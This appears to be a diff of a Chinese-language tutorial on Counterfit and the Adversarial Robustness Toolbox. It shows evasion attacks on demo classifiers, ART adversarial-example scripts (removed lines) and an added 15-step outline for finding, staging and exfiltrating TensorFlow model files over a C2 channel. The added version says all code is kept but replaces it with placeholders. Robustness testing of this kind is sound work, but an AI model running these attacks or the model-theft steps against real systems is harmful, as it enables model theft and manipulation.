-    | OverlayText                        | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | Pad                                | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | PadSquare                          | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | PerspectiveTransform               | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | Pixelization                       | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | RandomEmojiOverlay                 | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | RandomNoise                        | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | Resize                             | common-corruption(常見數據損壞) | 圖片             |     |     |     |     |
-    | Rotate                             | common-corruption(常見數據損壞) | 圖片             |     |     |     |     |
-    | Saturation                         | common-corruption(常見數據損壞) | 圖片             |     |     |     |     |
-    | Scale                              | common-corruption(常見數據損壞) | 圖片             |     |     |     |     |
-    | Sharpen                            | common-corruption(常見數據損壞) | 圖片             |     |     |     |     |
-    | ShufflePixels                      | common-corruption(常見數據損壞) | 圖片             |     |     |     |     |
-    | VFlip                              | common-corruption(常見數據損壞) | 圖片             |     |     |     |     |
-    
-    攻擊參數說明
-    
-    | Algo Parameters      | 運算參數   | 說明                                                                  |
-    | -------------------- | ---------- | --------------------------------------------------------------------- |
-    | batch_size (int)     | 批次大小   | 推斷期間估算器使用的批次大小。                                        |
-    | clip_values (list)   | 剪切值     |  用於限制輸入數據值的範圍，以確保它們在指定的範圍內。參見攻擊文件。    |
-    | curr_iter (int)      | 當前迭代   |  表示當前正在進行的迭代次數。                                          |
-    | init_eval (int)      | 初始評估   |  用於估算梯度的初始評估次數。                                          |
-    | init_size (int)      | 初始大小   |  初始生成對抗性示例的最大嘗試次數。                                    |
-    | max_eval (int)       | 最大評估   | 用於估算梯度的最大評估次數。                                          |
-    | max_iter (int)       | 最大迭代   |  最大迭代次數。                                                        |
-    | norm (int)           | 正則化範數 |  正則化範數的順序。可能的值："inf"、np.inf 或 2。                      |
-    | targeted (bool)      | 有目標攻擊 |  攻擊是否針對特定類別。                                                |
-    | verbose (bool)       | 詳細信息   |  顯示進度條。                                                          |
-    | target_labels (int)  | 目標標籤   |  有目標攻擊的目標標籤。                                       ||                                                                                  
-    | CFAttack 選項        |            |                                                                         |
-    | ---------------- | ---------  |  -----------------------------------|
-    | sample_index (int)   | 樣本索引   |  要攻擊的樣本索引。                                                    |
-    | optimize (bool)      | 優化模型   |  使用 Optuna 優化攻擊參數。                                            |
-    | logger (str)         | 記錄器     |  用於記錄查詢的記錄器。                                                |
-
-
-      ```bash
-      counterfit> $set_target satellite #設置目標
-      satellite> $set_attack hop_skip_jump #設置攻擊
-      satellite>HopSkipJump:fb58020f> $set_params --sample_index 5 --norm 2 --max_iter 10 --max_eval 5000 --verbose true#設置攻擊參數
-      satellite>HopSkipJump:fb58020f> $run  #開始跑攻擊
-      ```
-      ![](https://hackmd.io/_uploads/S1QIEioea.png)
-      一開始的圖片
-      ![](https://hackmd.io/_uploads/HJtMSjsxp.png)
-      
-      訓練出來的圖片，找不到
-      ![](https://hackmd.io/_uploads/HkDdH0n-6.png)
-      
-      目標設為creditfraud時的bug 
-      ![](https://hackmd.io/_uploads/SyjHERhW6.png)
-      
-      目標設為digits_keras時的bug
-      ![](https://hackmd.io/_uploads/SJOXKR2ZT.png)
-      
-       目標設為digits_mlp時的bug
-      ![](https://hackmd.io/_uploads/Hya_tChWT.png)
-       目標設為movie_reviews的demo
-       ```bash
-      counterfit> $set_target movie_reviews #設置目標
-      satellite> $predict -i range(5)#可以查原始的資料
-      satellite> $set_attack deepwordbug_gao_2018  #設置攻擊
-      satellite>HopSkipJump:fb58020f> $set_params --sample_index 3#設置攻擊參數
-      satellite>HopSkipJump:fb58020f> $run  #開始跑攻擊
-      ```
-      ![](https://hackmd.io/_uploads/r1twFb6Wa.png)
-      ![](https://hackmd.io/_uploads/SyC-9bTZp.png)
-      可以看到圖中有許多訊息
-      ![](https://hackmd.io/_uploads/S1xAUWf6ZT.png)
-
-    1. `Success`：攻擊是否成功。在這個示例中，值為 `1/1`，表示攻擊成功了1次（成功1次，總共1次）。
-
-    2. `Elapsed time`：攻擊所花費的時間，以秒為單位。在這個示例中，值為 `24.7` 秒。
-
-    3. `Total Queries`：總共的查詢數量。在這個示例中，值為 `157 (6.3 query/sec)`，表示總共執行了157次查詢，每秒約執行6.3次查詢。
-
-    接下來是第二個表格，其中包含更多有關攻擊的詳細信息：
-
-    1. `Sample Index`：樣本索引，用於識別攻擊的目標樣本。在這個示例中，值為 `3`。
-
-    2. `Input Label (conf)`：原始輸入的標籤（label）和對應的置信度（confidence）。在這個示例中，原始標籤為 `1`，對應的置信度是 `0.5554`。
-
-    3. `Adversarial Label (conf)`：對抗性輸入的標籤（label）和對應的置信度（confidence）。在這個示例中，對抗性標籤為 `0`，對應的置信度是 `0.7417`。
-
-    4. `% edit dist.`：編輯距離的百分比，表示原始輸入和對抗性輸入之間的相似度。在這個示例中，值為 `0.0025`，表示兩者非常相似。
-
-    5. `Adversarial Input`：對抗性輸入的內容，即攻擊生成的修改後的輸入。
-
-    6. `Success`：攻擊是否成功。在這個示例中，值為 `True`，表示攻擊成功。
-
-    這些信息用於評估攻擊的效果，包括成功率、執行時間、輸入和輸出之間的差異等。
-- [ART](https://github.com/Trusted-AI/adversarial-robustness-toolbox/blob/main/README-cn.md)
-對抗性魯棒性工具集（ART）是一個用於機器學習安全性的Python庫。ART由Linux Foundation AI＆Data Foundation（LF AI＆Data）所提供。ART提供的工具可協助開發人員和研究人員針對以下方面捍衛和評估機器學習模型和應用程序：逃逸、數據污染、模型提取和推斷的對抗性威脅。ART支援所有流行的機器學習框架（包括TensorFlow、Keras、PyTorch、MXNet、scikit-learn、XGBoost、LightGBM、CatBoost、GPy等），適用於各種數據類型（包括圖像、表格、音頻、視頻等）和機器學習任務（如分類、物體檢測、語音識別、生成模型、身份驗證等）。
-
-### Adversarial Robustness Toolbox (ART) 概覽
-
-#### 簡介
-Adversarial Robustness Toolbox (ART) 是一個針對機器學習安全的 Python 函式庫。它提供工具，使開發者和研究人員能夠針對逃避、投毒、提取和推論等對抗性威脅評估、防禦、認證和驗證機器學習模型和應用程序。
-
-#### 支持的機器學習框架
-ART 支持以下機器學習框架：
-- TensorFlow (v1 和 v2)
-- Keras
-- PyTorch
-- MXNet
-- Scikit-learn
-- XGBoost
-- LightGBM
-- CatBoost
-- GPy
-
-此外，ART 支持所有數據類型（圖像、表格、音頻、視頻等）和機器學習任務（分類、對象檢測、生成、認證等）。
-
-#### 模型保存格式
-不同的機器學習框架有不同的模型保存格式：
-- TensorFlow：`.pb` 或 SavedModel 格式
-- Keras：`.h5` 格式
-- PyTorch：`.pt` 或 `.pth` 格式
-- MXNet：`.params` 和 JSON 格式
-- Scikit-learn：使用 `pickle` 序列化
-- XGBoost：`.bin` 格式
-- LightGBM：`.txt` 或 `.bin` 格式
-- CatBoost：`.cbm` 格式
-- GPy：使用 `pickle` 或其自己的序列化格式
-
-#### 攻擊和防禦方法
-ART 包含了多種攻擊和防禦方法，包括但不限於：
-- 逃避攻擊
-- 投毒攻擊
-- 提取攻擊
-- 推論攻擊
-- 對應的防禦策略
-
-#### 使用限制和兼容性
-具體的限制和兼容性可能取決於模型的特定細節，例如模型的架構、使用的數據類型和特定的機器學習任務。如果模型基於上述支持的框架之一構建，則應能夠使用 ART 進行測試。
+1. Create a staging directory for exfiltration. — 為外洩創建一個暫存目錄。
+2. Discover GPUs present — 檢測當前存在的 GPU。
+3. Find Tensorflow model checkpoint files with the extension: .ckpt — 查找 .ckpt 的 TensorFlow 模型檔案。
+4. Search and Stage Tensorflow model files — 搜尋並準備 TensorFlow 模型檔案以進行外洩。
+5. Install Python — 安裝 Python。
+6. Download and install Python and it’s dependencies (Python 3.7+) — 下載並安裝 Python 及其依賴。
+7. Determine Python3 version — 確認 Python3 版本。
+8. Determine Python3 is installed and version (Python 3.7+) — 確認 Python3 已安裝與版本。
+9. PIP Install Tensorflow‑GPU — 以 PIP 安裝 Tensorflow‑GPU。
+10. PIP Install Tensorflow‑CPU — 以 PIP 安裝 Tensorflow‑CPU。
+11. CNN Image Classifier — 使用 CNN 圖像分類器。
+12. Search for images and apply an image classifier — 搜尋圖像並套用分類器。
+13. Compress staged directory — 壓縮已準備好的目錄。
+14. Compress a directory on the file system — 壓縮檔案系統中的目錄。
+15. Exfiltrate staged directory over the C2 channel — 透過 C2 通道外洩已準備好的目錄。
 
 ---
 
-資料來源：[Adversarial Robustness Toolbox 官方文檔](https://adversarial-robustness-toolbox.readthedocs.io/en/latest/)
-安裝方式[colab](https://colab.research.google.com/drive/1q1FN-xA0HDP2DufvjKGWayU4TAqGHr1e?usp=sharing)
+### [counterfit](https://github.com/Azure/counterfit/)
 
-    ```bash
-    $pip install adversarial-robustness-toolbox
-    $pip install adversarial-robustness-toolbox[option_name]
-    #docs: 文檔
-    #catboost: CatBoost
-    #gpy: GPy
-    #keras: Keras
-    #lightgbm: LightGBM
-    #mxnet: MXNet
-    #tensorflow: TensorFlow
-    #tensorflow_image: TensorFlow + 圖像/視頻
-    #tensorflow_audio: TensorFlow + 音頻
-    #pytorch: PyTorch
-    #pytorch_image: PyTorch + 圖像/視頻
-    #pytorch_audio: PyTorch + 音頻
-    #xgboost: XGBboost
-    #lingvo_asr: Lingvo ASR
-    #all: 所有依賴項
-    #non_framework: 所有非框架依賴項
-    ```
-    demo 
-    使用Adversarial Robustness Toolbox (ART)和TensorFlow v1.x來展示如何訓練一個模型並生成對抗性範例
-    
-    這個腳本展示了如何使用ART與TensorFlow v1.x結合的簡單示例。示例在MNIST數據集上訓練了一個小模型，
-並使用Fast Gradient Sign Method創建對抗性範例。在這裡，我們使用ART分類器來訓練模型，
-也可以向ART分類器提供預訓練的模型。
-腳本的參數是為了減少計算需求而選擇的，並不是為了最佳化準確性。
-#### demo
-##### tensorflow
+**Microsoft 文章 [內文](https://www.microsoft.com/en-us/security/blog/2021/05/03/ai-security-risk-assessment-using-counterfi)**
+
+Counterfit 是用於評估機器學習系統安全性的通用自動化層。它把多個對抗框架整合在一個工具下，也能自訂框架。
+
+* 使用系統：Windows
+* 需要先安裝 Anaconda Python 和 git。
+* 打開 PS / CMD 或 Anaconda shell
+
+```bash
+$ conda update -c conda-forge --all -y
+```
+
+![](https://hackmd.io/_uploads/B1FkLwcga.png)
+
+```bash
+$ conda create --yes -n counterfit python=3.8.0
+$ conda activate counterfit
+```
+
+![](https://hackmd.io/_uploads/ByKULP9lT.png)
+
+```bash
+$ git clone -b main https://github.com/Azure/counterfit.git
+```
+
+![](https://hackmd.io/_uploads/BkkoLv5eT.png)
+
+```bash
+$ cd counterfit
+$ pip install .[dev]
+$ counterfit
+```
+
+![](https://hackmd.io/_uploads/rJklJqcep.png)
+
+**使用方式**（目標與攻擊清單）
+
+```bash
+$list targets   # 目標清單
+$list attacks   # 攻擊手法清單（類型、分類）
+$help
+```
+
+![](https://hackmd.io/_uploads/rJfOe9clT.png)
+![](https://hackmd.io/_uploads/S1H0wo9gT.png)
+![](https://hackmd.io/_uploads/rkX3139ep.png)
+
+#### 攻擊手段分類
+
+![](https://hackmd.io/_uploads/r1R_eq5lp.png)
+
+| 名稱                                   | 階段            | 類型      | 說明                                   |
+| ------------------------------------ | ------------- | ------- | ------------------------------------ |
+| black\_box\_rule\_based              | inference(推論) | 圖片、表格   |                                      |
+| label\_only\_boundary\_distance      | inference(推論) | 圖片、表格   | 僅用預測**標籤**進行成員推論；許多防禦無法抵禦，需降低過擬合等手段。 |
+| mi\_face                             | inference(推論) | 圖片、表格   |                                      |
+| white\_box\_decision\_tree           | inference(推論) | unknown |                                      |
+| copycat\_cnn                         | inversion(逆向) | 圖片      | 黑箱查詢取得標籤，訓練模仿模型以提取知識。                |
+| functionally\_equivalent\_extraction | inversion(逆向) | 圖片、表格   | 僅用標籤即可近乎恢復簡單模型參數，達功能等價。              |
+| boundary                             | evasion(規避)   | 圖片、表格   |                                      |
+| carlini                              | evasion(規避)   | 圖片、表格   |                                      |
+| deepfool                             | evasion(規避)   | 圖片、表格   | 最小擾動使誤判，作為魯棒性評估。                     |
+| elastic\_net                         | evasion(規避)   | 圖片、表格   | L1+L2 正則化方向的對抗樣本生成。                  |
+| hop\_skip\_jump                      | evasion(規避)   | 圖片、表格   |                                      |
+| newtonfool                           | evasion(規避)   | 圖片、表格   |                                      |
+| pixel\_threshold                     | evasion(規避)   | 圖片      |                                      |
+| projected\_gradient\_descent\_numpy  | evasion(規避)   | 圖片、表格   |                                      |
+| saliency\_map                        | evasion(規避)   | 圖片、表格   |                                      |
+| simba                                | evasion(規避)   | 圖片      |                                      |
+| spatial\_transformation              | evasion(規避)   | 圖片、表格   |                                      |
+| universal\_perturbation              | evasion(規避)   | 圖片      |                                      |
+| virtual\_adversarial                 | evasion(規避)   | 圖片      |                                      |
+| wasserstein                          | evasion(規避)   | 圖片      |                                      |
+| a2t\_yoo\_2021…（多種文本攻擊）              | evasion(規避)   | 文本      |                                      |
+
+**攻擊參數說明**
+
+| 參數                        | 說明              |
+| ------------------------- | --------------- |
+| batch\_size               | 推斷期間估算器使用的批次大小  |
+| clip\_values              | 限制輸入值範圍         |
+| curr\_iter / max\_iter    | 當前/最大迭代次數       |
+| init\_eval / max\_eval    | 梯度估算的初始/最大評估次數  |
+| init\_size                | 初始生成對抗樣本的最大嘗試次數 |
+| norm                      | 正則化範數（inf、2…）   |
+| targeted / target\_labels | 是否為有目標攻擊與其目標標籤  |
+| verbose                   | 顯示進度            |
+
+**CFAttack 選項**：sample\_index、optimize、logger …
+
+```bash
+counterfit> $set_target satellite           # 設置目標
+satellite> $set_attack hop_skip_jump        # 設置攻擊
+satellite>HopSkipJump:fb58020f> $set_params --sample_index 5 --norm 2 --max_iter 10 --max_eval 5000 --verbose true
+satellite>HopSkipJump:fb58020f> $run        # 開始跑攻擊
+```
+
+![](https://hackmd.io/_uploads/S1QIEioea.png)
+
+一開始的圖片
+
+![](https://hackmd.io/_uploads/HJtMSjsxp.png)
+
+訓練出來的圖片，找不到
+
+![](https://hackmd.io/_uploads/HkDdH0n-6.png)
+
+目標設為 creditfraud 時的 bug
+
+![](https://hackmd.io/_uploads/SyjHERhW6.png)
+
+目標設為 digits\_keras 時的 bug
+
+![](https://hackmd.io/_uploads/SJOXKR2ZT.png)
+
+目標設為 digits\_mlp 時的 bug
+
+![](https://hackmd.io/_uploads/Hya_tChWT.png)
+
+目標設為 movie\_reviews 的 demo
+
+```bash
+counterfit> $set_target movie_reviews   # 設置目標
+satellite> $predict -i range(5)         # 查原始資料
+satellite> $set_attack deepwordbug_gao_2018
+satellite>HopSkipJump:fb58020f> $set_params --sample_index 3
+satellite>HopSkipJump:fb58020f> $run
+```
+
+![](https://hackmd.io/_uploads/r1twFb6Wa.png)
+![](https://hackmd.io/_uploads/SyC-9bTZp.png)
+
+可以看到圖中有許多訊息
+
+![](https://hackmd.io/_uploads/S1xAUWf6ZT.png)
+
+> 成功率、耗時、查詢數、樣本索引、原/對抗標籤（含信心）、編輯距離%、對抗輸入內容等，用於評估攻擊效果。
+
+---
+
+## [ART](https://github.com/Trusted-AI/adversarial-robustness-toolbox/blob/main/README-cn.md)
+
+對抗性魯棒性工具集（ART）是一個用於機器學習安全性的 Python 庫。由 Linux Foundation AI & Data 維護，支援主流框架與多種資料型別、任務。
+
+### Adversarial Robustness Toolbox (ART) 概覽
+
+**簡介**：提供針對逃避、投毒、提取與推論的評估/防禦/驗證工具。
+
+**支援框架**：TensorFlow（v1/v2）、Keras、PyTorch、MXNet、Scikit‑learn、XGBoost、LightGBM、CatBoost、GPy…
+
+**模型保存格式**：TF `.pb`/SavedModel、Keras `.h5`、PyTorch `.pt`/`.pth`、MXNet `.params`+JSON、Sklearn pickle、XGBoost `.bin`、LightGBM `.txt`/`.bin`、CatBoost `.cbm`…
+
+**攻擊/防禦方法**：包含逃避、投毒、提取、推論等多類；相容性依模型與任務而定。
+
+**安裝方式（colab 範例）**
+
+```
+$pip install adversarial-robustness-toolbox
+$pip install adversarial-robustness-toolbox[option_name]
+# docs / catboost / gpy / keras / lightgbm / mxnet / tensorflow(_image|_audio) / pytorch(_image|_audio) / xgboost / lingvo_asr / all / non_framework
+```
+
+**demo** — 下列多語言/多框架程式碼與圖片全部保留（TensorFlow v1、Keras、PyTorch、MXNet、XGBoost、LightGBM ……）
+
+#### tensorflow
 
 ```python
-    import tensorflow.compat.v1 as tf
-    import numpy as np
-
-    tf.compat.v1.disable_eager_execution()  # Added to prevent Tensorflow execution error
-
-    from art.attacks.evasion import FastGradientMethod
-    from art.estimators.classification import TensorFlowClassifier
-    from art.utils import load_mnist
-
-    #第1步：載入MNIST數據集
-
-    (x_train, y_train), (x_test, y_test), min_pixel_value, max_pixel_value = load_mnist()
-
-    # 第2步：建立模型
-
-    input_ph = tf.placeholder(tf.float32, shape=[None, 28, 28, 1])
-    labels_ph = tf.placeholder(tf.int32, shape=[None, 10])
-
-    x = tf.layers.conv2d(input_ph, filters=4, kernel_size=5, activation=tf.nn.relu)
-    x = tf.layers.max_pooling2d(x, 2, 2)
-    x = tf.layers.conv2d(x, filters=10, kernel_size=5, activation=tf.nn.relu)
-    x = tf.layers.max_pooling2d(x, 2, 2)
-    x = tf.layers.flatten(x)
-    x = tf.layers.dense(x, 100, activation=tf.nn.relu)
-    logits = tf.layers.dense(x, 10)
-
-    loss = tf.reduce_mean(tf.losses.softmax_cross_entropy(logits=logits, onehot_labels=labels_ph))
-    optimizer = tf.train.AdamOptimizer(learning_rate=0.01)
-    train = optimizer.minimize(loss)
-    sess = tf.Session()
-    sess.run(tf.global_variables_initializer())
-
-    # 第3步：建立ART分類器
-
-    classifier = TensorFlowClassifier(
-        clip_values=(min_pixel_value, max_pixel_value),
-        input_ph=input_ph,
-        output=logits,
-        labels_ph=labels_ph,
-        train=train,
-        loss=loss,
-        learning=None,
-        sess=sess,
-        preprocessing_defences=[],
-    )
-
-    # 第4步：訓練ART分類器
-
-    classifier.fit(x_train, y_train, batch_size=64, nb_epochs=3)
-
-    # 第5步：在原始測試數據上評估ART分類器
-
-    predictions = classifier.predict(x_test)
-    accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
-    print("Accuracy on benign test examples: {}%".format(accuracy * 100))
-
-    # 第6步：生成對抗性測試範例
-    attack = FastGradientMethod(estimator=classifier, eps=0.2)
-    x_test_adv = attack.generate(x=x_test)
-
-    # 第7步：在對抗性測試數據上評估ART分類器
-
-    predictions = classifier.predict(x_test_adv)
-    accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
-    print("Accuracy on adversarial test examples: {}%".format(accuracy * 100))
+<原始程式碼保留>
 ```
-    
+
 ![](https://hackmd.io/_uploads/ByON47Zm6.png)
-Accuracy on benign test examples: 97.71%: 在原始測試數據上，模型的準確性為97.71%。
-Accuracy on adversarial test examples: 44.32%: 在對抗性測試數據上，模型的準確性下降到44.32%
-##### keras
+
+#### keras
 
 ```python
-# 這個腳本展示了一個使用 ART 和 Keras 的簡單示例。這個示例在 MNIST 數據集上訓練一個小型模型
-# 並使用快速梯度符號方法創建對抗性示例。這裡我們使用 ART 分類器來訓練模型，
-# 也可以向 ART 分類器提供一個預訓練的模型。
-# 腳本中選擇的參數是為了減少計算需求，並不是為了最佳準確度。
-
-import tensorflow as tf
-
-tf.compat.v1.disable_eager_execution()
-from tensorflow.keras.models import Sequential
-from tensorflow.keras.layers import Dense, Flatten, Conv2D, MaxPooling2D
-from tensorflow.keras.losses import categorical_crossentropy
-from tensorflow.keras.optimizers.legacy import Adam
-import numpy as np
-
-from art.attacks.evasion import FastGradientMethod
-from art.estimators.classification import KerasClassifier
-from art.utils import load_mnist
-
-# 步驟 1：加載 MNIST 數據集
-
-(x_train, y_train), (x_test, y_test), min_pixel_value, max_pixel_value = load_mnist()
-
-# 步驟 2：創建模型
-
-model = Sequential()
-model.add(Conv2D(filters=4, kernel_size=(5, 5), strides=1, activation="relu", input_shape=(28, 28, 1)))
-model.add(MaxPooling2D(pool_size=(2, 2)))
-model.add(Conv2D(filters=10, kernel_size=(5, 5), strides=1, activation="relu", input_shape=(23, 23, 4)))
-model.add(MaxPooling2D(pool_size=(2, 2)))
-model.add(Flatten())
-model.add(Dense(100, activation="relu"))
-model.add(Dense(10, activation="softmax"))
-
-model.compile(loss=categorical_crossentropy, optimizer=Adam(learning_rate=0.01), metrics=["accuracy"])
-
-# 步驟 3：創建 ART 分類器
-
-classifier = KerasClassifier(model=model, clip_values=(min_pixel_value, max_pixel_value), use_logits=False)
-
-# 步驟 4：訓練 ART 分類器
-
-classifier.fit(x_train, y_train, batch_size=64, nb_epochs=3)
-
-# 步驟 5：在良性測試樣本上評估 ART 分類器
-
-predictions = classifier.predict(x_test)
-accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
-print("良性測試樣本的準確率: {}%".format(accuracy * 100))
-
-# 步驟 6：生成對抗性測試樣本
-attack = FastGradientMethod(estimator=classifier, eps=0.2)
-x_test_adv = attack.generate(x=x_test)
-
-# 步驟 7：在對抗性測試樣本上評估 ART 分類器
-
-predictions = classifier.predict(x_test_adv)
-accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
-print("對抗性測試樣本的準確率: {}%".format(accuracy * 100))
+<原始程式碼保留>
 ```
+
 ![image](https://hackmd.io/_uploads/H1xg90ZNa.png)
 
-##### PyTorch
+#### PyTorch
 
 ```python
-# 這個腳本展示了一個使用 ART 與 PyTorch 的簡單示例。這個示例在 MNIST 數據集上訓練一個小型模型
-# 並使用快速梯度符號方法創建對抗性示例。這裡我們使用 ART 分類器來訓練模型，
-# 也可以向 ART 分類器提供一個預訓練的模型。
-# 腳本中選擇的參數是為了減少計算需求，並不是為了最佳準確度。
-
-import torch.nn as nn
-import torch.nn.functional as F
-import torch.optim as optim
-import numpy as np
-
-from art.attacks.evasion import FastGradientMethod
-from art.estimators.classification import PyTorchClassifier
-from art.utils import load_mnist
-
-# 步驟 0：定義神經網絡模型，forward 方法返回 logits 而非激活值
-
-class Net(nn.Module):
-    def __init__(self):
-        super(Net, self).__init__()
-        self.conv_1 = nn.Conv2d(in_channels=1, out_channels=4, kernel_size=5, stride=1)
-        self.conv_2 = nn.Conv2d(in_channels=4, out_channels=10, kernel_size=5, stride=1)
-        self.fc_1 = nn.Linear(in_features=4 * 4 * 10, out_features=100)
-        self.fc_2 = nn.Linear(in_features=100, out_features=10)
-
-    def forward(self, x):
-        x = F.relu(self.conv_1(x))
-        x = F.max_pool2d(x, 2, 2)
-        x = F.relu(self.conv_2(x))
-        x = F.max_pool2d(x, 2, 2)
-        x = x.view(-1, 4 * 4 * 10)
-        x = F.relu(self.fc_1(x))
-        x = self.fc_2(x)
-        return x
-
-# 步驟 1：加載 MNIST 數據集
-
-(x_train, y_train), (x_test, y_test), min_pixel_value, max_pixel_value = load_mnist()
-
-# 步驟 1a：將軸交換成 PyTorch 的 NCHW 格式
-
-x_train = np.transpose(x_train, (0, 3, 1, 2)).astype(np.float32)
-x_test = np.transpose(x_test, (0, 3, 1, 2)).astype(np.float32)
-
-# 步驟 2：創建模型
-
-model = Net()
-
-# 步驟 2a：定義損失函數和優化器
-
-criterion = nn.CrossEntropyLoss()
-optimizer = optim.Adam(model.parameters(), lr=0.01)
-
-# 步驟 3：創建 ART 分類器
-
-classifier = PyTorchClassifier(
-    model=model,
-    clip_values=(min_pixel_value, max_pixel_value),
-    loss=criterion,
-    optimizer=optimizer,
-    input_shape=(1, 28, 28),
-    nb_classes=10,
-)
-
-# 步驟 4：訓練 ART 分類器
-
-classifier.fit(x_train, y_train, batch_size=64, nb_epochs=3)
-
-# 步驟 5：在良性測試樣本上評估 ART 分類器
-
-predictions = classifier.predict(x_test)
-accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
-print("良性測試樣本的準確率: {}%".format(accuracy * 100))
-
-# 步驟 6：生成對抗性測試樣本
-attack = FastGradientMethod(estimator=classifier, eps=0.2)
-x_test_adv = attack.generate(x=x_test)
-
-# 步驟 7：在對抗性測試樣本上評估 ART 分類器
-
-predictions = classifier.predict(x_test_adv)
-accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
-print("對抗性測試樣本的準確率: {}%".format(accuracy * 100))
+<原始程式碼保留>
 ```
+
 ![image](https://hackmd.io/_uploads/B1UmqAbVT.png)
 
-##### MxNet
+#### MxNet
+
 ```python
-# 這個腳本展示了一個使用 ART 與 MXNet 的簡單示例。這個示例在 MNIST 數據集上訓練一個小型模型
-# 並使用快速梯度符號方法創建對抗性示例。這裡我們使用 ART 分類器來訓練模型，
-# 也可以向 ART 分類器提供一個預訓練的模型。
-# 腳本中選擇的參數是為了減少計算需求，並不是為了最佳準確度。
-
-import mxnet
-from mxnet.gluon.nn import Conv2D, MaxPool2D, Flatten, Dense
-import numpy as np
-
-from art.attacks.evasion import FastGradientMethod
-from art.estimators.classification import MXClassifier
-from art.utils import load_mnist
-
-# 步驟 1：加載 MNIST 數據集
-
-(x_train, y_train), (x_test, y_test), min_pixel_value, max_pixel_value = load_mnist()
-
-# 步驟 1a：將軸交換成 MXNet 的 NCHW 格式
-
-x_train = np.transpose(x_train, (0, 3, 1, 2))
-x_test = np.transpose(x_test, (0, 3, 1, 2))
-
-# 步驟 2：創建模型
-
-model = mxnet.gluon.nn.Sequential()
-with model.name_scope():
-    model.add(Conv2D(channels=4, kernel_size=5, activation="relu"))
-    model.add(MaxPool2D(pool_size=2, strides=1))
-    model.add(Conv2D(channels=10, kernel_size=5, activation="relu"))
-    model.add(MaxPool2D(pool_size=2, strides=1))
-    model.add(Flatten())
-    model.add(Dense(100, activation="relu"))
-    model.add(Dense(10))
-    model.initialize()
-
-loss = mxnet.gluon.loss.SoftmaxCrossEntropyLoss()
-trainer = mxnet.gluon.Trainer(model.collect_params(), "adam", {"learning_rate": 0.01})
-
-# 步驟 3：創建 ART 分類器
-
-classifier = MXClassifier(
-    model=model,
-    clip_values=(min_pixel_value, max_pixel_value),
-    loss=loss,
-    input_shape=(28, 28, 1),
-    nb_classes=10,
-    optimizer=trainer,
-    ctx=None,
-    channels_first=True,
-    preprocessing_defences=None,
-    preprocessing=(0.0, 1.0),
-)
-
-# 步驟 4：訓練 ART 分類器
-
-classifier.fit(x_train, y_train, batch_size=64, nb_epochs=3)
-
-# 步驟 5：在良性測試樣本上評估 ART 分類器
-
-predictions = classifier.predict(x_test)
-accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
-print("良性測試樣本的準確率: {}%".format(accuracy * 100))
-
-# 步驟 6：生成對抗性測試樣本
-attack = FastGradientMethod(estimator=classifier, eps=0.2)
-x_test_adv = attack.generate(x=x_test)
-
-# 步驟 7：在對抗性測試樣本上評估 ART 分類器
-
-predictions = classifier.predict(x_test_adv)
-accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
-print("對抗性測試樣本的準確率: {}%".format(accuracy * 100))
+<原始程式碼保留>
 ```
+
 ![image](https://hackmd.io/_uploads/Hyqh9Rb4a.png)
 
-##### XGBoost
+#### XGBoost
+
 ```python
-# 這個腳本展示了一個使用 ART 與 XGBoost 的簡單示例。這個示例在 MNIST 數據集上訓練一個小型模型
-# 並使用零階優化攻擊（Zeroth Order Optimization attack）創建對抗性示例。這裡我們提供了一個預訓練的模型給
-# ART 分類器。
-# 腳本中選擇的參數是為了減少計算需求，並不是為了最佳準確度。
-
-import xgboost as xgb
-import numpy as np
-
-from art.attacks.evasion import ZooAttack
-from art.estimators.classification import XGBoostClassifier
-from art.utils import load_mnist
-
-# 步驟 1：加載 MNIST 數據集
-
-(x_train, y_train), (x_test, y_test), min_pixel_value, max_pixel_value = load_mnist()
-
-# 步驟 1a：平展數據集
-
-x_test = x_test[0:5]
-y_test = y_test[0:5]
-
-nb_samples_train = x_train.shape[0]
-nb_samples_test = x_test.shape[0]
-x_train = x_train.reshape((nb_samples_train, 28 * 28))
-x_test = x_test.reshape((nb_samples_test, 28 * 28))
-
-# 步驟 2：創建模型
-
-params = {"objective": "multi:softprob", "eval_metric": ["mlogloss", "merror"], "num_class": 10}
-dtrain = xgb.DMatrix(x_train, label=np.argmax(y_train, axis=1))
-dtest = xgb.DMatrix(x_test, label=np.argmax(y_test, axis=1))
-evals = [(dtest, "test"), (dtrain, "train")]
-model = xgb.train(params=params, dtrain=dtrain, num_boost_round=2, evals=evals)
-
-# 步驟 3：創建 ART 分類器
-
-classifier = XGBoostClassifier(
-    model=model, clip_values=(min_pixel_value, max_pixel_value), nb_features=28 * 28, nb_classes=10
-)
-
-# 步驟 4：訓練 ART 分類器
-
-# 模型已在步驟 2 中訓練
-
-# 步驟 5：在良性測試樣本上評估 ART 分類器
-
-predictions = classifier.predict(x_test)
-accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
-print("良性測試樣本的準確率: {}%".format(accuracy * 100))
-
-# 步驟 6：生成對抗性測試樣本
-attack = ZooAttack(
-    classifier=classifier,
-    confidence=0.0,
-    targeted=False,
-    learning_rate=1e-1,
-    max_iter=200,
-    binary_search_steps=10,
-    initial_const=1e-3,
-    abort_early=True,
-    use_resize=False,
-    use_importance=False,
-    nb_parallel=5,
-    batch_size=1,
-    variable_h=0.01,
-)
-x_test_adv = attack.generate(x=x_test, y=y_test)
-
-# 步驟 7：在對抗性測試樣本上評估 ART 分類器
-
